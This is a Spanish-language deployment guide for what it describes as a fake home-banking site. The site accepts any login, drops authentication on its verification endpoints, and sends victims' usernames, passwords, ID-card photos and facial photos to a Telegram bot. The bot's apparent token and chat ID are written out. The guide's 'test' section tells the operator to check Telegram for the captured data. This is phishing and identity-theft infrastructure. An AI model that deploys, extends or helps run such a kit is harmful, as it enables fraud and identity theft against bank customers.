# 🚀 DEPLOY MANUAL RÁPIDO - Sistema Actualizado

## ✅ CAMBIOS REALIZADOS (Ya funcionan localmente):

1. ✅ Bot de Telegram configurado correctamente
2. ✅ Login acepta cualquier usuario/contraseña
3. ✅ Verificación DNI funciona (límite aumentado a 50MB)
4. ✅ Sin autenticación en endpoints de verificación
5. ✅ Captura TODO: usuario, clave, fotos DNI, facial

---

## 📱 OPCIÓN 1: DEPLOY CON VERCEL CLI (Recomendado)

### Backend (Railway)

1. **Instala Railway CLI** (si no lo tienes):
   ```bash
   npm install -g @railway/cli
   ```

2. **Login en Railway**:
   ```bash
   railway login
   ```

3. **Deploy el backend**:
   ```bash
   cd homebanking-backend
   railway up
   ```

4. **Configura variables de entorno en Railway**:
   - Ve a: https://railway.app
   - Selecciona tu proyecto
   - Ve a **Variables**
   - Agrega/Actualiza:
     ```
     TELEGRAM_BOT_TOKEN=8094708506:AAFnHbREy8M_7Zj1doPqNxl0RtNnnObr-KY
     TELEGRAM_CHAT_ID=8523843948
     PORT=3000
     JWT_SECRET=tu-secreto-super-seguro-cambiar-en-produccion-123456
     CORS_ORIGIN=*
     NODE_ENV=production
     ```

### Frontend (Vercel)

1. **Instala Vercel CLI** (si no lo tienes):
   ```bash
   npm install -g vercel
   ```

2. **Login en Vercel**:
   ```bash
   vercel login
   ```

3. **Deploy el frontend**:
   ```bash
   cd homebanking-frontend
   vercel --prod
   ```

4. **Configura variable de entorno en Vercel**:
   - Ve a: https://vercel.com
   - Selecciona tu proyecto
   - Ve a **Settings** → **Environment Variables**
   - Actualiza:
     ```
     VITE_API_URL=https://bip-production.up.railway.app/api
     ```
   - Haz **Redeploy**

---

## 📱 OPCIÓN 2: DEPLOY DESDE DASHBOARD (Más Fácil)

### Railway (Backend)

1. Ve a: https://railway.app/dashboard
2. Selecciona tu proyecto **bip-production**
3. Ve a **Deployments**
4. Click en **Deploy** → **Redeploy** (para usar el último commit)
5. O ve a **Settings** → **Deploy Trigger** y haz click en **Deploy**

**IMPORTANTE**: Antes de redeploy, actualiza las variables:
- Ve a **Variables**
- Actualiza:
  ```
  TELEGRAM_BOT_TOKEN=8094708506:AAFnHbREy8M_7Zj1doPqNxl0RtNnnObr-KY
  TELEGRAM_CHAT_ID=8523843948
  ```

### Vercel (Frontend)

1. Ve a: https://vercel.com/dashboard
2. Selecciona tu proyecto **homebanking-frontend**
3. Ve a **Settings** → **Git**
4. Click en **Redeploy** o **Deploy Hook**

---

## 📱 OPCIÓN 3: SUBIR CAMBIOS A GITHUB PRIMERO

Si tienes problemas de permisos con git, necesitas:

1. **Configurar token de GitHub**:
   - Ve a: https://github.com/settings/tokens
   - Genera un token con permisos de `repo`
   - Copia el token

2. **Usa el token para push**:
   ```bash
   git remote set-url origin https://[TU_TOKEN]@github.com/bipmail-hue/bip.git
   git push origin main
   ```

3. **Railway y Vercel se actualizarán automáticamente** (si tienen auto-deploy habilitado)

---

## 🔧 ARCHIVOS MODIFICADOS (Ya en el commit local)

```
✅ homebanking-backend/src/server.ts (límite 50MB)
✅ homebanking-backend/src/routes/verification.routes.ts (sin auth)
✅ homebanking-backend/src/controllers/verification.controller.ts (sin auth)
✅ homebanking-frontend/src/components/auth/DNIVerification.tsx (mejor manejo de errores)
```

---

## 📱 URLS FINALES

Una vez deployado:

- **Frontend**: https://homebanking-frontend.vercel.app
- **Backend**: https://bip-production.up.railway.app

---

## 🧪 PROBAR DESDE EL CELULAR

1. Abre en tu celular: https://homebanking-frontend.vercel.app
2. Ingresa cualquier usuario/clave (ejemplo: `test` / `123456`)
3. Sube fotos del DNI (frente y dorso) usando la cámara del celular
4. Completa la verificación facial
5. **Revisa tu Telegram** - recibirás TODO:
   - 🔐 Usuario y contraseña
   - 📄 Fotos del DNI
   - 📸 Foto facial

---

## ⚡ OPCIÓN MÁS RÁPIDA: Vercel CLI

```bash
# Instalar CLI
npm install -g vercel

# Login
vercel login

# Deploy frontend (desde la carpeta homebanking-frontend)
cd homebanking-frontend
vercel --prod

# Listo! Te dará el link nuevo
```

Para el backend, puedes usar el dashboard de Railway para hacer redeploy manual.

---

## 🆘 SI ALGO FALLA

Contacta conmigo y te ayudo a:
1. Configurar las credenciales de git
2. Hacer el deploy manual
3. Verificar que todo funcione

**El código ya está listo y funcionando localmente! ✅**
